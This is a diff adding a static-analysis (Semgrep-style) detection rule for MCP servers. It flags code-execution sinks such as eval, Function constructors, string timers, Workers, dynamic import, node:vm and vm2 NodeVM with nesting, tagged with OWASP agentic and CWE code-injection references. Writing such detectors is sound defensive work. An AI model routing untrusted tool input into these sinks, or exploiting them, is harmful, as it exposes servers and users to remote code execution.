+                      - pattern-inside: "$FS.writeFile($PATH, $CODE, ...);\n...\nnew $WORKER(<... $PATH ...>, ...);"
+                      - pattern-inside: "$FS.writeFileSync($PATH, $CODE, ...);\n...\nnew $WORKER(<... $PATH ...>, ...);"
+                      - pattern-inside: "$FS.outputFile($PATH, $CODE, ...);\n...\nnew $WORKER(<... $PATH ...>, ...);"
+                      - pattern-inside: "$FS.outputFileSync($PATH, $CODE, ...);\n...\nnew $WORKER(<... $PATH ...>, ...);"
+                      - pattern-inside: "Bun.write($PATH, $CODE, ...);\n...\nnew $WORKER(<... $PATH ...>, ...);"
+                  - metavariable-regex:
+                      metavariable: $WORKER
+                      regex: ^(?:[\w$]+\.)?Worker$
+          # The written contents themselves, not a later use of the same name.
+          - pattern-inside: $WRITE($PATH, $CODE, ...)
+          - metavariable-regex:
+              metavariable: $WRITE
+              regex: ^(?:(?:[\w$]+\.)*(?:writeFile|writeFileSync|outputFile|outputFileSync)|Bun\.write)$
+          - pattern: $CODE
+      # Code execution: eval (also indirect, `(0, eval)(x)`), new Function and its async and
+      # generator siblings, setTimeout / setInterval with a string (browsers evaluate it), a
+      # worker_threads Worker with `eval: true`, and dynamic import() of a chosen specifier (a
+      # data: URL runs inline).
+      - patterns:
+          - pattern-either:
+              - pattern-inside: eval($CODE)
+              - pattern-inside: (0, eval)($CODE)
+              # AsyncFunction, GeneratorFunction, AsyncGeneratorFunction: the constructor of a
+              # function literal (`Object.getPrototypeOf(async function () {}).constructor`),
+              # bound to a name or used inline.
+              - patterns:
+                  - pattern-either:
+                      - patterns:
+                          - pattern-either:
+                              - pattern-inside: |
+                                  $CTOR = Object.getPrototypeOf($FNLIT).constructor;
+                                  ...
+                              - pattern-inside: |
+                                  $CTOR = $FNLIT.constructor;
+                                  ...
+                          - pattern-either:
+                              - pattern-inside: new $CTOR(..., $CODE, ...)
+                              - pattern-inside: $CTOR(..., $CODE, ...)
+                      - pattern-inside: new (Object.getPrototypeOf($FNLIT).constructor)(..., $CODE, ...)
+                      - pattern-inside: new ($FNLIT.constructor)(..., $CODE, ...)
+                  - metavariable-regex:
+                      metavariable: $FNLIT
+                      regex: (?s)^\(*\s*(?:async\b|function\b|\([^()]*\)\s*=>|[\w$]+\s*=>)
+              - patterns:
+                  - pattern-inside: $GLOBAL.eval($CODE)
+                  - metavariable-regex:
+                      metavariable: $GLOBAL
+                      regex: ^(?:globalThis|window|self|global)$
+              - pattern-inside: new Function(..., $CODE, ...)
+              - pattern-inside: Function(..., $CODE, ...)
+              - patterns:
+                  - pattern-inside: $TIMER($CODE, ...)
+                  - metavariable-regex:
+                      metavariable: $TIMER
+                      regex: ^(?:(?:globalThis|window|self)\.)?(?:setTimeout|setInterval)$
+              - patterns:
+                  - pattern-inside: 'new $WORKER($CODE, {..., eval: true, ...})'
+                  - metavariable-regex:
+                      metavariable: $WORKER
+                      regex: ^(?:[\w$]+\.)?Worker$
+              - pattern-inside: import($CODE)
+          - pattern: $CODE
+      # The node:vm module, which Node documents as "not a security mechanism": the code
+      # argument of runInNewContext, runInContext, runInThisContext, compileFunction, new Script,
+      # and new SourceTextModule. A compiled Script's own run methods take a context object,
+      # which is data.
+      - patterns:
+          - pattern-either:
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          import * as $VM from "$MOD";
+                          ...
+                      - pattern-inside: |
+                          import $VM from "$MOD";
+                          ...
+                      - pattern-inside: |
+                          $VM = require("$MOD");
+                          ...
+                  - pattern-either:
+                      - pattern-inside: $VM.$FN($CODE, ...)
+                      - pattern-inside: new $VM.$FN($CODE, ...)
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          import { $FN } from "$MOD";
+                          ...
+                      - pattern-inside: |
+                          const { $FN } = require("$MOD");
+                          ...
+                  - pattern-either:
+                      - pattern-inside: $FN($CODE, ...)
+                      - pattern-inside: new $FN($CODE, ...)
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          import { $FN as $ALIAS } from "$MOD";
+                          ...
+                      - pattern-inside: |
+                          const { $FN: $ALIAS } = require("$MOD");
+                          ...
+                  - pattern-either:
+                      - pattern-inside: $ALIAS($CODE, ...)
+                      - pattern-inside: new $ALIAS($CODE, ...)
+          - metavariable-regex:
+              metavariable: $MOD
+              regex: ^(?:node:)?vm$
+          - metavariable-regex:
+              metavariable: $FN
+              regex: ^(?:runInNewContext|runInContext|runInThisContext|compileFunction|Script|SourceTextModule)$
+          - pattern: $CODE
+      # vm2's NodeVM with `nesting: true`: sandboxed code can build its own NodeVM that
+      # requires any host module, so vm2's README says it grants the sandbox your own trust.
+      - patterns:
+          - pattern-either:
+              - pattern-inside: 'new $NODEVM({..., nesting: true, ...}).run($CODE, ...)'
+              - pattern-inside: |
+                  $SANDBOX = new $NODEVM({..., nesting: true, ...});
+                  ...
+                  $SANDBOX.run($CODE, ...);
+              # Kept on a class: a field initialiser or a constructor assignment.
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          class $K { ... $FIELD = new $NODEVM({..., nesting: true, ...}); ... }
+                      - pattern-inside: |
+                          class $K { ... constructor(...) { ... this.$FIELD = new $NODEVM({..., nesting: true, ...}); ... } ... }
+                  - pattern-inside: this.$FIELD.run($CODE, ...)
+          - metavariable-regex:
+              metavariable: $NODEVM
+              regex: ^(?:[\w$]+\.)?NodeVM$
+          - pattern-inside: $RUNNER.run($CODE, ...)
+          - pattern: $CODE
+    metadata:
+      category: security
+      subcategory: [vuln]
+      pack-category: mcp-server
+      owasp-llm:
+        - "LLM10:2026 - Improper Output Handling"
+        - "LLM05:2025 - Improper Output Handling"
+      owasp-agentic:
+        - "ASI05 - Unexpected Code Execution (RCE)"
+        - "ASI02 - Tool Misuse and Exploitation"
+      owasp-mcp:
+        - "MCP05:2025 - Command Injection & Execution"
+      owasp-aisvs:
+        - "v1.01-C10.4.4 - Schema, Message, and Input Validation"
+      mitre-atlas:
+        - "AML.T0053 - AI Agent Tool Invocation"
+        - "AML.T0050 - Command and Scripting Interpreter"
+      cwe:
+        - "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+        - "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+      confidence: HIGH
+      likelihood: MEDIUM
+      impact: HIGH
+      technology: [mcp, fastmcp, claude-agent-sdk, node, execa, bun]
+      references:
+        - https://github.com/modelcontextprotocol/typescript-sdk/blob/v2.3.1/packages/server/src/server/mcp.ts
+        - https://github.com/modelcontextprotocol/typescript-sdk/blob/1.32.1/src/server/mcp.ts
+        - https://github.com/punkpeye/fastmcp/blob/v4.23.5/src/FastMCP.ts
+        - https://github.com/sindresorhus/execa/blob/v10.2.0/docs/shell.md
+        - https://github.com/oven-sh/bun/blob/bun-v1.4.4/docs/runtime/shell.mdx
+        - https://nodejs.org/api/child_process.html#child_processexeccommand-options
+        - https://github.com/nodejs/node/blob/v24.22.1/doc/api/vm.md
+        - https://github.com/OWASP/www-project-mcp-top-10/blob/165fe0f78ef104459237b4a8e0f6e78db9b02391/2025/MCP05-2025%E2%80%93Command-Injection%26Execution.md
